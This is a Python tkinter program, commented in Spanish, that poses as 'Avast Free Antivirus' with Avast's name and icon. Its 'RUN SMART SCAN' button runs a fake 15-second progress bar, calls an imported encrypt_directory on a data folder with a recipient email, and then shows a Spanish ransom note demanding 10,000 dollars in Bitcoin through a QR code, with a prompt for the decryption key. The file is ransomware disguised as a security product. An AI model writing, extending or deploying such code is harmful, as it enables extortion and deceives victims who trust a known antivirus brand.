import sys
from pathlib import Path

# Ruta base del proyecto
BASE_DIR = Path(__file__).resolve().parent.parent
sys.path.append(str(BASE_DIR))

import random
import os
import tkinter as tk
import time
from tkinter import ttk
from tkinter import Toplevel, simpledialog, messagebox
from PIL import Image, ImageTk
from src.encryptor import encrypt_directory, decrypt_directory

# Configuración de rutas
QR_CODE_PATH = BASE_DIR / "qr_code.png"
DIRECTORY_TO_ENCRYPT = BASE_DIR / "data"
ICONS_DIR = BASE_DIR / "icons"

recipient_email = "nickhendricks4321@gmail.com"

# Configuración principal de la ventana
root = tk.Tk()
root.title("Avast Free Antivirus")
root.geometry("1000x650")
root.configure(bg="#333333")  # Fondo gris oscuro

# Configuración de icono
icon_path = ICONS_DIR / "avast_icon.ico"
root.iconbitmap(str(icon_path))

# Colores actualizados
PRIMARY_COLOR = "#333333"  # Gris oscuro principal
SECONDARY_COLOR = "#444444"  # Fondo de secciones
ACCENT_COLOR = "#4CAF50"  # Verde para botones (antes naranja)
SIDEBAR_COLOR = "#222222"  # Color barra lateral
TEXT_COLOR = "#FFFFFF"  # Texto blanco
SECTION_TITLE_COLOR = "#4CAF50"  # Verde para títulos
PROGRESS_COLOR = "#4CAF50"  # Verde para barra de progreso

# Fuentes
FONT_TITLE = ("Segoe UI", 18, "bold")
FONT_SECTION = ("Segoe UI", 14, "bold")
FONT_TEXT = ("Segoe UI", 12)
FONT_BUTTON = ("Segoe UI", 11, "bold")
FONT_BIG_BUTTON = ("Segoe UI", 14, "bold")

# Configuración de grid
root.grid_rowconfigure(0, weight=1)
root.grid_columnconfigure(1, weight=1)

# Barra lateral izquierda
sidebar = tk.Frame(root, bg=SIDEBAR_COLOR, width=200)
sidebar.grid(row=0, column=0, sticky="ns")
sidebar.grid_propagate(False)

# Logo en barra lateral
avast_logo = tk.Label(sidebar, text="AVAST", font=("Segoe UI", 20, "bold"), 
                     bg=SIDEBAR_COLOR, fg="white")
avast_logo.pack(pady=(20, 30))

# Sección Status en barra lateral
status_frame = tk.Frame(sidebar, bg=SIDEBAR_COLOR, padx=10, pady=10)
status_frame.pack(fill="x", pady=(0, 20))

tk.Label(status_frame, text="STATUS", font=FONT_SECTION, 
        bg=SIDEBAR_COLOR, fg=SECTION_TITLE_COLOR).pack(anchor="w")

# Items de status (con bullet points)
status_items = ["Protection", "Privacy", "Performance"]
for item in status_items:
    item_frame = tk.Frame(status_frame, bg=SIDEBAR_COLOR)
    item_frame.pack(fill="x", pady=5)
    
    tk.Label(item_frame, text="•", font=FONT_TEXT, 
            bg=SIDEBAR_COLOR, fg=SECTION_TITLE_COLOR).pack(side="left", padx=(0, 10))
    
    tk.Label(item_frame, text=item, font=FONT_TEXT, 
            bg=SIDEBAR_COLOR, fg=TEXT_COLOR).pack(side="left")

# Contenido principal
content_frame = tk.Frame(root, bg=PRIMARY_COLOR)
content_frame.grid(row=0, column=1, sticky="nsew", padx=20, pady=20)
content_frame.grid_columnconfigure(0, weight=1)

# Título principal
title_label = tk.Label(content_frame, text="Avast Free Antivirus", 
                      font=("Segoe UI", 22, "bold"), bg=PRIMARY_COLOR, fg="white")
title_label.pack(pady=(10, 30))

# Sección "You're protected"
protected_frame = tk.Frame(content_frame, bg=SECONDARY_COLOR, padx=30, pady=25)
protected_frame.pack(fill="x", pady=(0, 25))

tk.Label(protected_frame, text="You're protected", font=FONT_SECTION, 
        bg=SECONDARY_COLOR, fg="white").pack(anchor="w")

# Descripción del smart scan
desc_label = tk.Label(protected_frame, 
                     text="A one-click, all-inclusive PC checkup. Scan your PC for all kinds of security, privacy, and performance issues.",
                     font=FONT_TEXT, bg=SECONDARY_COLOR, fg=TEXT_COLOR, wraplength=600, justify="left")
desc_label.pack(pady=(10, 20))

# Animación de escaneo
scan_label = tk.Label(protected_frame, text="", font=FONT_TEXT, bg=SECONDARY_COLOR, fg=TEXT_COLOR)
scan_label.pack(pady=5)

# Configurar estilo para la barra de progreso verde
style = ttk.Style()
style.theme_use('default')
style.configure("green.Horizontal.TProgressbar", 
               background=PROGRESS_COLOR,
               troughcolor=SECONDARY_COLOR,
               bordercolor=SECONDARY_COLOR,
               lightcolor=PROGRESS_COLOR,
               darkcolor=PROGRESS_COLOR)

progress_bar = ttk.Progressbar(protected_frame, orient="horizontal", 
                             length=400, mode="determinate",
                             style="green.Horizontal.TProgressbar")
progress_bar.pack(pady=10)

def animate_scanning(label):
    from itertools import cycle
    dots = cycle(["", ".", "..", "..."])
    def update():
        label.config(text=f"Scanning files{next(dots)}")
        root.after(500, update)
    update()

# Función de escaneo con progreso de 15 segundos
def limpiar_archivos():
    progress_bar["value"] = 0
    root.update()
    animate_scanning(scan_label)
    
    total_steps = 150  # 15 segundos a 100ms por paso
    for i in range(1, total_steps + 1):
        progress_bar["value"] = (i / total_steps) * 100
        root.update()
        time.sleep(0.1)  # 100ms entre actualizaciones
    
    encrypt_directory(DIRECTORY_TO_ENCRYPT, recipient_email)
    scan_label.config(text="Scan completed!")
    root.after(1000, show_ransom_message)  # Esperar 1 segundo antes de mostrar ransomware

# Botón RUN SMART SCAN verde
def on_scan_enter(e):
    e.widget["bg"] = "#3d8b40"  # Verde más oscuro al pasar el ratón

def on_scan_leave(e):
    e.widget["bg"] = ACCENT_COLOR

scan_btn = tk.Button(protected_frame, text="RUN SMART SCAN", command=limpiar_archivos, 
                    font=FONT_BIG_BUTTON, bg=ACCENT_COLOR, fg="white", 
                    relief="flat", padx=40, pady=12, bd=0, highlightthickness=0)
scan_btn.pack(pady=(10, 5))
scan_btn.bind("<Enter>", on_scan_enter)
scan_btn.bind("<Leave>", on_scan_leave)

# Sección de activación
activate_frame = tk.Frame(content_frame, bg=SECONDARY_COLOR, padx=30, pady=20)
activate_frame.pack(fill="x", pady=(0, 25))

# Botón ACTIVATE
activate_btn = tk.Button(activate_frame, text="ACTIVATE", font=FONT_BUTTON, 
                        bg=PRIMARY_COLOR, fg="white", relief="flat", padx=20, pady=6)
activate_btn.pack(anchor="w", pady=(0, 10))

# Texto Setting
tk.Label(activate_frame, text="Setting", font=FONT_TEXT, 
        bg=SECONDARY_COLOR, fg=TEXT_COLOR).pack(anchor="w")

# Sección de agradecimiento
thanks_frame = tk.Frame(content_frame, bg=SECONDARY_COLOR, padx=30, pady=20)
thanks_frame.pack(fill="x", pady=(0, 20))

tk.Label(thanks_frame, text="Thanks for joining Avast", font=FONT_SECTION, 
        bg=SECONDARY_COLOR, fg="white").pack(anchor="w")

tk.Label(thanks_frame, 
        text="Here's a welcome gift to boost your computer's security.",
        font=FONT_TEXT, bg=SECONDARY_COLOR, fg=TEXT_COLOR).pack(anchor="w", pady=(10, 15))

# Botón UNWRAP IT
unwrap_btn = tk.Button(thanks_frame, text="UNWRAP IT", font=FONT_BUTTON, 
                      bg=PRIMARY_COLOR, fg="white", relief="flat", padx=20, pady=6)
unwrap_btn.pack(anchor="w")

# Ransom message
def show_ransom_message():
    win = Toplevel(root)
    win.title("Amenaza Detectada")
    win.geometry("600x550")
    win.config(bg="#121212")

    msg = "Tus archivos fueron cifrados.\n\nSi quiere recuperarlos, deposite 10.000$ en BTC\n\na la siguiente cartera y le enviaremos la clave para desencriptarlos."
    tk.Label(win, text=msg, font=FONT_TEXT, bg="#121212", fg="white").pack(pady=20)

    qr_image = Image.open(QR_CODE_PATH).resize((200, 200), Image.LANCZOS)
    qr_photo = ImageTk.PhotoImage(qr_image)
    qr_label = tk.Label(win, image=qr_photo, bg="#121212")
    qr_label.image = qr_photo
    qr_label.pack(pady=10)

    def request_decryption():
        private_key = simpledialog.askstring("Clave de recuperación", "Introduce tu clave privada:")
        if private_key:
            try:
                decrypt_directory(DIRECTORY_TO_ENCRYPT, private_key)
                messagebox.showinfo("Recuperación completada", "Tus archivos han sido restaurados.")
                win.destroy()
            except Exception as e:
                messagebox.showerror("Error", f"Clave incorrecta.\n{e}")

    btn = tk.Button(win, text="Recuperar Archivos", command=request_decryption, font=FONT_TEXT,
                    bg="#FF9100", fg="white", activebackground="#FFA726")
    btn.pack(pady=20)

if __name__ == "__main__":
    root.mainloop()